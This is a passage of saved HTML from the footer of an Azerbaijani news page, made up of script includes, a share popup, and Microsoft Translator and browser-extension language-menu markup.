(document,screen)</script><!--/LiveInternet-->
</div>
            <br><br>Hazırlayan və ideya müəllifi: <a href="https://www.facebook.com/azizoglu1989" class="fade2" target="_blank" title="" style="opacity: 1;" data-original-title="Hazırlayan və ideya müəllifi">Elshan Azizoglu</a>
            <br>
            
       

        </div>
	</div>
</div>
<!-- END Footer bottom -->	
<div class="gotop" style="bottom: 15px;"><a title="Вверх"></a></div>

<script type="text/javascript" src="./xeber_files/jquery.tools.min.js.download"></script>
<script type="text/javascript" src="./xeber_files/modernizr.js.download"></script>
<script type="text/javascript" src="./xeber_files/a.js.download"></script>
<script type="text/javascript" src="./xeber_files/jquery.cycle.all.min.js.download"></script>
<script type="text/javascript" src="./xeber_files/custom.js.download"></script>
<script type="text/javascript" src="./xeber_files/jquery.hoverIntent.minified.js.download"></script>
<script type="text/javascript" src="./xeber_files/b.js.download"></script>
<script type="text/javascript" src="./xeber_files/cherry-scripts.js.download"></script>
<script type="text/javascript" src="./xeber_files/validation.js.download"></script>
    



<!-- DataLife Engine Copyright SoftNews Media Group (http://dle-news.ru) -->
<div id="share-popup" style="display:none"><div class="social"><p>Поделиться ссылкой на выделенный текст</p><ul><li><a href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#" class="tw"><span></span>Twitter</a></li><li><a href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#" class="fb"><span></span>Facebook</a></li><li><a href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#" class="vk"><span></span>Вконтакте</a></li></ul></div><div class="link"><p>Прямая ссылка:</p><a href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html"><ins></ins></a><span>Нажмите правой клавишей мыши и выберите «Копировать ссылку»</span></div></div><a id="txtselect_marker" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#"></a><div id="volume-booster-visusalizer">
                    <div class="sound">
                        <div class="sound-icon"></div>
                        <div class="sound-wave sound-wave_one"></div>
                        <div class="sound-wave sound-wave_two"></div>
                        <div class="sound-wave sound-wave_three"></div>
                    </div>
                    <div class="segments-box">
                        <div data-range="1-20" class="segment"><span></span></div>
                        <div data-range="21-40" class="segment"><span></span></div>
                        <div data-range="41-60" class="segment"><span></span></div>
                        <div data-range="61-80" class="segment"><span></span></div>
                        <div data-range="81-100" class="segment"><span></span></div>
                    </div>
                </div><textarea id="BFI_DATA" style="width: 1px; height: 1px; display: none;"></textarea><title> </title><div id="WidgetFloaterPanels" translate="no" style="display: none; text-align: left; direction: ltr; visibility: hidden;" class="LTRStyle"> <div id="WidgetFloater" style="display: none" onmouseover="Microsoft.Translator.OnMouseOverFloater()" onmouseout="Microsoft.Translator.OnMouseOutFloater()"> <div id="WidgetLogoPanel"> <span id="WidgetTranslateWithSpan"><span>TRANSLATE with </span><img id="FloaterLogo"></span> <span id="WidgetCloseButton" title="Exit Translation" onclick="Microsoft.Translator.FloaterOnClose()">x</span></div> <div id="LanguageMenuPanel"> <div class="DDStyle_outer"><input name="LanguageMenu_svid" type="text" id="LanguageMenu_svid" style="display:none;" autocomplete="on" value="en" onclick="this.select()"> <input name="LanguageMenu_textid" type="text" id="LanguageMenu_textid" style="display:none;" autocomplete="on" onclick="this.select()"> <span onselectstart="return false" tabindex="0" class="DDStyle" id="__LanguageMenu_header" onclick="return LanguageMenu &amp;&amp; !LanguageMenu.Show(&#39;__LanguageMenu_popup&#39;, event);" onkeydown="return LanguageMenu &amp;&amp; !LanguageMenu.Show(&#39;__LanguageMenu_popup&#39;, event);">English</span> <div style="position:relative;text-align:left;left:0;"><div style="position:absolute;width:;left:0px;"><div class="DDStyle" style="display:none;" id="__LanguageMenu_popup"> <table id="LanguageMenu" border="0"> <tbody><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;ar&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#ar">Arabic</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;he&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#he">Hebrew</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;pl&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#pl">Polish</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;bg&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#bg">Bulgarian</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;hi&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#hi">Hindi</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;pt&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#pt">Portuguese</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;ca&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#ca">Catalan</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;mww&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#mww">Hmong Daw</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;ro&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#ro">Romanian</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;zh-CHS&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#zh-CHS">Chinese Simplified</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;hu&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#hu">Hungarian</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;ru&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#ru">Russian</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;zh-CHT&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#zh-CHT">Chinese Traditional</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;id&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#id">Indonesian</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;sk&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#sk">Slovak</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;cs&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#cs">Czech</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;it&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#it">Italian</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;sl&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#sl">Slovenian</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;da&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#da">Danish</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;ja&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#ja">Japanese</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;es&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#es">Spanish</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;nl&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#nl">Dutch</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;tlh&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#tlh">Klingon</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;sv&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#sv">Swedish</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;en&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#en">English</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;ko&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#ko">Korean</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;th&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#th">Thai</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;et&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#et">Estonian</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;lv&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#lv">Latvian</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;tr&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#tr">Turkish</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;fi&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#fi">Finnish</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;lt&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#lt">Lithuanian</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;uk&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#uk">Ukrainian</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;fr&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#fr">French</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;ms&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#ms">Malay</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;ur&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#ur">Urdu</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;de&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#de">German</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;mt&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#mt">Maltese</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;vi&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#vi">Vietnamese</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;el&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#el">Greek</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;no&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#no">Norwegian</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;cy&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#cy">Welsh</a></td> </tr><tr> <td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;ht&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#ht">Haitian Creole</a></td><td><a tabindex="-1" onclick="return LanguageMenu.onclick(&#39;fa&#39;);" ondragstart="LanguageMenu.ondragstart(event);" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#fa">Persian</a></td><td></td> </tr> </tbody></table> <img alt="" style="height:7px;width:17px;border-width:0px;left:20px;"> </div></div></div></div> <script type="text/javascript"> var LanguageMenu; var LanguageMenu_keys=["ar","bg","ca","zh-CHS","zh-CHT","cs","da","nl","en","et","fi","fr","de","el","ht","he","hi","mww","hu","id","it","ja","tlh","ko","lv","lt","ms","mt","no","fa","pl","pt","ro","ru","sk","sl","es","sv","th","tr","uk","ur","vi","cy"]; var LanguageMenu_values=["Arabic","Bulgarian","Catalan","Chinese Simplified","Chinese Traditional","Czech","Danish","Dutch","English","Estonian","Finnish","French","German","Greek","Haitian Creole","Hebrew","Hindi","Hmong Daw","Hungarian","Indonesian","Italian","Japanese","Klingon","Korean","Latvian","Lithuanian","Malay","Maltese","Norwegian","Persian","Polish","Portuguese","Romanian","Russian","Slovak","Slovenian","Spanish","Swedish","Thai","Turkish","Ukrainian","Urdu","Vietnamese","Welsh"]; var LanguageMenu_callback=function(){ }; var LanguageMenu_popupid='__LanguageMenu_popup'; </script> </div> <div id="CTFLinksPanel"> <span id="ExternalLinksPanel"><a id="HelpLink" title="Help" target="_blank" href="https://go.microsoft.com/?linkid=9722454"> <img id="HelpImg"></a> <a id="EmbedLink" href="javascript:Microsoft.Translator.FloaterShowEmbed()" title="Get this widget for your own site"> <img id="EmbedImg"></a> <a id="ShareLink" title="Share translated page with friends" href="javascript:Microsoft.Translator.FloaterShowSharePanel()"> <img id="ShareImg"></a> </span> </div> <div id="FloaterProgressBar"> <span id="ProgressFill"></span> </div> </div> <div id="WidgetFloaterCollapsed" style="display: none" onmouseover="Microsoft.Translator.OnMouseOverFloater()"> <span>TRANSLATE with </span><img id="CollapsedLogoImg"></div> <div id="FloaterSharePanel" style="display: none"> <div id="ShareTextDiv"> <span id="ShareTextSpan"> COPY THE URL BELOW </span> </div> <div id="ShareTextboxDiv"> <input name="ShareTextbox" type="text" id="ShareTextbox" readonly="readonly" onclick="this.select()"> <!--a id="TwitterLink" title="Share on Twitter"> <img id="TwitterImg" /></a> <a-- id="FacebookLink" title="Share on Facebook"> <img id="FacebookImg" /></a--> <a id="EmailLink" title="Email this translation"> <img id="EmailImg"></a> </div> <div id="ShareFooter"> <span id="ShareHelpSpan"><a id="ShareHelpLink"> <img id="ShareHelpImg"></a></span> <span id="ShareBackSpan"><a id="ShareBack" href="javascript:Microsoft.Translator.FloaterOnShareBackClick()" title="Back To Translation"> Back</a></span> </div> <input name="EmailSubject" type="hidden" id="EmailSubject" value="Check out this page in {0} translated from {1}"> <input name="EmailBody" type="hidden" id="EmailBody" value="Translated: {0}%0d%0aOriginal: {1}%0d%0a%0d%0aAutomatic translation powered by Microsoft® Translator%0d%0ahttp://www.bing.com/translator?ref=MSTWidget"> <input type="hidden" id="ShareHelpText" value="This link allows visitors to launch this page and automatically translate it to {0}."> </div> <div id="FloaterEmbed" style="display: none"> <div id="EmbedTextDiv"> <span id="EmbedTextSpan">EMBED THE SNIPPET BELOW IN YOUR SITE</span> <a id="EmbedHelpLink" title="Copy this code and place it into your HTML."> <img id="EmbedHelpImg"></a> </div> <div id="EmbedTextboxDiv"> <input name="EmbedSnippetTextBox" type="text" id="EmbedSnippetTextBox" readonly="readonly" value="&lt;div id=&#39;MicrosoftTranslatorWidget&#39; class=&#39;Dark&#39; style=&#39;color:white;background-color:#555555&#39;&gt;&lt;/div&gt;&lt;script type=&#39;text/javascript&#39;&gt;setTimeout(function(){var s=document.createElement(&#39;script&#39;);s.type=&#39;text/javascript&#39;;s.charset=&#39;UTF-8&#39;;s.src=((location &amp;&amp; location.href &amp;&amp; location.href.indexOf(&#39;https&#39;) == 0)?&#39;https://ssl.microsofttranslator.com&#39;:&#39;http://www.microsofttranslator.com&#39;)+&#39;/ajax/v3/WidgetV3.ashx?siteData=ueOIGRSKkd965FeEGM5JtQ**&amp;ctf=true&amp;ui=true&amp;settings=manual&amp;from=en&#39;;var p=document.getElementsByTagName(&#39;head&#39;)[0]||document.documentElement;p.insertBefore(s,p.firstChild); },0);&lt;/script&gt;" onclick="this.select()"> </div> <div id="EmbedNoticeDiv"><span id="EmbedNoticeSpan">Enable collaborative features and customize widget: <a href="http://www.bing.com/widget/translator" target="_blank">Bing Webmaster Portal</a></span></div> <div id="EmbedFooterDiv"><span id="EmbedBackSpan"><a href="javascript:Microsoft.Translator.FloaterOnEmbedBackClick()" title="Back To Translation">Back</a></span></div> </div> <script type="text/javascript"> var intervalId = setInterval(function () { if (MtPopUpList) { LanguageMenu = new MtPopUpList(); var langMenu = document.getElementById(LanguageMenu_popupid); var origLangDiv = document.createElement("div"); origLangDiv.id = "OriginalLanguageDiv"; origLangDiv.innerHTML = "<span id='OriginalTextSpan'>ORIGINAL: </span><span id='OriginalLanguageSpan'></span>"; langMenu.appendChild(origLangDiv); LanguageMenu.Init('LanguageMenu', LanguageMenu_keys, LanguageMenu_values, LanguageMenu_callback, LanguageMenu_popupid); window["LanguageMenu"] = LanguageMenu; clearInterval(intervalId); } }, 1); </script> </div><div class="TnITTtw-fp-collapsed-button" style="display: block;"></div><div class="TnITTtw-mate-fp-bar" translate="no" style="z-index: 2147483647; width: 0px; height: 0px; opacity: 0; display: none;">    <div class="TnITTtw-hide-fp-bar" style="display: none;"></div>    <div class="TnITTtw-current-page-lang" style="display: none;">This page is in Azerbaijani</div>    <div class="TnITTtw-cta-button-layout" style="display: none;">        <div class="TnITTtw-spinner">            <div class="TnITTtw-bounce1"></div>            <div class="TnITTtw-bounce2"></div>            <div class="TnITTtw-bounce3"></div>        </div>        <div class="TnITTtw-mw-button TnITTtw-fp-translate TnITTtw-high-cta" style="display: none;">Translate to English</div>    </div>    <div class="TnITTtw-change-language TnITTtw-select" data-for-serial="3" style="display: none;"></div>    <div class="TnITTtw-stop-fp"></div>    <div class="TnITTtw-toggle-iphone-settings" style="display: none;"></div>    <div class="TnITTtw-ui_selector" style="display: none;">        <div class="TnITTtw-options-arrow"></div>        <div class="TnITTtw-options TnITTtw-opt-3 TnITTtw-standalone" data-serial="3" style="display: none; z-index: 998;">            <div class="TnITTtw-dd-search">                <input class="TnITTtw-dd-input" type="text" data-dir="to" placeholder="Search" data-width="NaN">            </div>            <div id="selVisibleScroll-3">                <div id="selEntireScroll-3">                    <div class="TnITTtw-inner-options-layout">                        <ul class="TnITTtw-list"><li class="lang-af TnITTtw-option" index="1"><span id="lang-af" val="af" class="lang-af">Afrikaans</span></li><li class="lang-sq TnITTtw-option" index="2"><span id="lang-sq" val="sq" class="lang-sq">Albanian</span></li><li class="lang-am TnITTtw-option" index="3"><span id="lang-am" val="am" class="lang-am">Amharic</span></li><li class="lang-ar TnITTtw-option" index="4"><span id="lang-ar" val="ar" class="lang-ar">Arabic</span></li><li class="lang-hy TnITTtw-option" index="5"><span id="lang-hy" val="hy" class="lang-hy">Armenian</span></li><li class="lang-az TnITTtw-option" index="6"><span id="lang-az" val="az" class="lang-az">Azerbaijani</span></li><li class="lang-bn TnITTtw-option" index="7"><span id="lang-bn" val="bn" class="lang-bn">Bengali</span></li><li class="lang-bg TnITTtw-option" index="8"><span id="lang-bg" val="bg" class="lang-bg">Bulgarian</span></li><li class="lang-ca TnITTtw-option" index="9"><span id="lang-ca" val="ca" class="lang-ca">Catalan</span></li><li class="lang-hr TnITTtw-option" index="10"><span id="lang-hr" val="hr" class="lang-hr">Croatian</span></li><li class="lang-cs TnITTtw-option" index="11"><span id="lang-cs" val="cs" class="lang-cs">Czech</span></li><li class="lang-da TnITTtw-option" index="12"><span id="lang-da" val="da" class="lang-da">Danish</span></li><li class="lang-nl TnITTtw-option" index="13"><span id="lang-nl" val="nl" class="lang-nl">Dutch</span></li><li class="lang-en TnITTtw-option_selected" index="14"><span id="lang-en" val="en" class="lang-en">English</span></li><li class="lang-et TnITTtw-option" index="15"><span id="lang-et" val="et" class="lang-et">Estonian</span></li><li class="lang-fi TnITTtw-option" index="16"><span id="lang-fi" val="fi" class="lang-fi">Finnish</span></li><li class="lang-fr TnITTtw-option" index="17"><span id="lang-fr" val="fr" class="lang-fr">French</span></li><li class="lang-de TnITTtw-option" index="18"><span id="lang-de" val="de" class="lang-de">German</span></li><li class="lang-el TnITTtw-option" index="19"><span id="lang-el" val="el" class="lang-el">Greek</span></li><li class="lang-gu TnITTtw-option" index="20"><span id="lang-gu" val="gu" class="lang-gu">Gujarati</span></li><li class="lang-ht TnITTtw-option" index="21"><span id="lang-ht" val="ht" class="lang-ht">Haitian Creole</span></li><li class="lang-iw TnITTtw-option" index="22"><span id="lang-iw" val="iw" class="lang-iw">Hebrew</span></li><li class="lang-hi TnITTtw-option" index="23"><span id="lang-hi" val="hi" class="lang-hi">Hindi</span></li><li class="lang-hu TnITTtw-option" index="24"><span id="lang-hu" val="hu" class="lang-hu">Hungarian</span></li><li class="lang-is TnITTtw-option" index="25"><span id="lang-is" val="is" class="lang-is">Icelandic</span></li><li class="lang-id TnITTtw-option" index="26"><span id="lang-id" val="id" class="lang-id">Indonesian</span></li><li class="lang-it TnITTtw-option" index="27"><span id="lang-it" val="it" class="lang-it">Italian</span></li><li class="lang-ja TnITTtw-option" index="28"><span id="lang-ja" val="ja" class="lang-ja">Japanese</span></li><li class="lang-kn TnITTtw-option" index="29"><span id="lang-kn" val="kn" class="lang-kn">Kannada</span></li><li class="lang-kk TnITTtw-option" index="30"><span id="lang-kk" val="kk" class="lang-kk">Kazakh</span></li><li class="lang-km TnITTtw-option" index="31"><span id="lang-km" val="km" class="lang-km">Khmer</span></li><li class="lang-ko TnITTtw-option" index="32"><span id="lang-ko" val="ko" class="lang-ko">Korean</span></li><li class="lang-ku TnITTtw-option" index="33"><span id="lang-ku" val="ku" class="lang-ku">Kurdish (Kurmanji)</span></li><li class="lang-lo TnITTtw-option" index="34"><span id="lang-lo" val="lo" class="lang-lo">Lao</span></li><li class="lang-lv TnITTtw-option" index="35"><span id="lang-lv" val="lv" class="lang-lv">Latvian</span></li><li class="lang-lt TnITTtw-option" index="36"><span id="lang-lt" val="lt" class="lang-lt">Lithuanian</span></li><li class="lang-mg TnITTtw-option" index="37"><span id="lang-mg" val="mg" class="lang-mg">Malagasy</span></li><li class="lang-ms TnITTtw-option" index="38"><span id="lang-ms" val="ms" class="lang-ms">Malay</span></li><li class="lang-ml TnITTtw-option" index="39"><span id="lang-ml" val="ml" class="lang-ml">Malayalam</span></li><li class="lang-mt TnITTtw-option" index="40"><span id="lang-mt" val="mt" class="lang-mt">Maltese</span></li><li class="lang-mi TnITTtw-option" index="41"><span id="lang-mi" val="mi" class="lang-mi">Maori</span></li><li class="lang-mr TnITTtw-option" index="42"><span id="lang-mr" val="mr" class="lang-mr">Marathi</span></li><li class="lang-my TnITTtw-option" index="43"><span id="lang-my" val="my" class="lang-my">Myanmar (Burmese)</span></li><li class="lang-ne TnITTtw-option" index="44"><span id="lang-ne" val="ne" class="lang-ne">Nepali</span></li><li class="lang-no TnITTtw-option" index="45"><span id="lang-no" val="no" class="lang-no">Norwegian</span></li><li class="lang-ps TnITTtw-option" index="46"><span id="lang-ps" val="ps" class="lang-ps">Pashto</span></li><li class="lang-fa TnITTtw-option" index="47"><span id="lang-fa" val="fa" class="lang-fa">Persian</span></li><li class="lang-pl TnITTtw-option" index="48"><span id="lang-pl" val="pl" class="lang-pl">Polish</span></li><li class="lang-pt TnITTtw-option" index="49"><span id="lang-pt" val="pt" class="lang-pt">Portuguese</span></li><li class="lang-pa TnITTtw-option" index="50"><span id="lang-pa" val="pa" class="lang-pa">Punjabi</span></li><li class="lang-ro TnITTtw-option" index="51"><span id="lang-ro" val="ro" class="lang-ro">Romanian</span></li><li class="lang-ru TnITTtw-option" index="52"><span id="lang-ru" val="ru" class="lang-ru">Russian</span></li><li class="lang-sm TnITTtw-option" index="53"><span id="lang-sm" val="sm" class="lang-sm">Samoan</span></li><li class="lang-zh-CN TnITTtw-option" index="54"><span id="lang-zh-CN" val="zh-CN" class="lang-zh-CN">Simplified Chinese</span></li><li class="lang-sk TnITTtw-option" index="55"><span id="lang-sk" val="sk" class="lang-sk">Slovak</span></li><li class="lang-sl TnITTtw-option" index="56"><span id="lang-sl" val="sl" class="lang-sl">Slovenian</span></li><li class="lang-es TnITTtw-option" index="57"><span id="lang-es" val="es" class="lang-es">Spanish</span></li><li class="lang-sv TnITTtw-option" index="58"><span id="lang-sv" val="sv" class="lang-sv">Swedish</span></li><li class="lang-ta TnITTtw-option" index="59"><span id="lang-ta" val="ta" class="lang-ta">Tamil</span></li><li class="lang-te TnITTtw-option" index="60"><span id="lang-te" val="te" class="lang-te">Telugu</span></li><li class="lang-th 